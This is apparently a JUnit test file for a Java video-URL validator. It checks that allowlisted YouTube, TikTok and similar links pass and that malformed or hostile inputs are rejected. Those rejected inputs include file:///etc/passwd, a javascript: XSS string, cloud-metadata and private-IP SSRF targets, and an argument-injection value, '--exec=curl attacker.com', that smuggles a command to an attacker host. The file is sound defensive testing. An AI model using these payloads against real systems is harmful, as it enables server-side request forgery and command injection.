package com.app.categorise.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

class VideoUrlValidatorTest {

    @Nested
    @DisplayName("validate")
    class Validate {

        @Test
        @DisplayName("Accepts valid YouTube URLs")
        void acceptsValidYouTubeUrls() {
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://www.youtube.com/watch?v=abc123"));
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://youtu.be/abc123"));
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://m.youtube.com/watch?v=abc123"));
        }

        @Test
        @DisplayName("Accepts valid TikTok URLs")
        void acceptsValidTikTokUrls() {
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://www.tiktok.com/@user/video/123"));
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://vm.tiktok.com/abc123/"));
        }

        @Test
        @DisplayName("Accepts valid Instagram and other platform URLs")
        void acceptsOtherPlatformUrls() {
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://www.instagram.com/reel/abc123/"));
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://vimeo.com/123456"));
            assertDoesNotThrow(() -> VideoUrlValidator.validate("https://x.com/user/status/123"));
        }

        @Test
        @DisplayName("Rejects null and blank URLs")
        void rejectsNullAndBlank() {
            IllegalArgumentException ex1 = assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate(null));
            assertEquals("Missing 'videoUrl' in request body", ex1.getMessage());

            IllegalArgumentException ex2 = assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate(""));
            assertEquals("Missing 'videoUrl' in request body", ex2.getMessage());

            IllegalArgumentException ex3 = assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("   "));
            assertEquals("Missing 'videoUrl' in request body", ex3.getMessage());
        }

        @Test
        @DisplayName("Rejects URLs exceeding max length")
        void rejectsOverlongUrls() {
            String longUrl = "https://www.youtube.com/watch?v=" + "a".repeat(2048);
            IllegalArgumentException ex = assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate(longUrl));
            assertTrue(ex.getMessage().contains("maximum length"));
        }

        @Test
        @DisplayName("Rejects non-HTTPS schemes")
        void rejectsNonHttpsSchemes() {
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("http://www.youtube.com/watch?v=abc123"));
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("ftp://www.youtube.com/video"));
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("file:///etc/passwd"));
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("javascript:alert(1)"));
        }

        @Test
        @DisplayName("Rejects non-allowlisted domains")
        void rejectsNonAllowlistedDomains() {
            IllegalArgumentException ex = assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("https://evil.com/malware"));
            assertTrue(ex.getMessage().contains("not a supported video platform"));
        }

        @Test
        @DisplayName("Rejects invalid URL formats")
        void rejectsInvalidUrlFormats() {
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("not a url at all"));
        }

        @Test
        @DisplayName("Rejects URLs with no hostname")
        void rejectsUrlsWithNoHost() {
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("https:///path/only"));
        }

        @Test
        @DisplayName("Rejects SSRF attempts targeting metadata endpoints")
        void rejectsSsrfAttempts() {
            // Internal network / cloud metadata — these will fail at domain allowlist before IP check
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("https://169.254.169.254/latest/meta-data/"));
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("https://10.0.0.1/internal"));
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("https://192.168.1.1/admin"));
        }

        @Test
        @DisplayName("Rejects argument injection attempts (URLs starting with --)")
        void rejectsArgumentInjectionAttempts() {
            assertThrows(IllegalArgumentException.class,
                    () -> VideoUrlValidator.validate("--exec=curl attacker.com"));
        }
    }
}
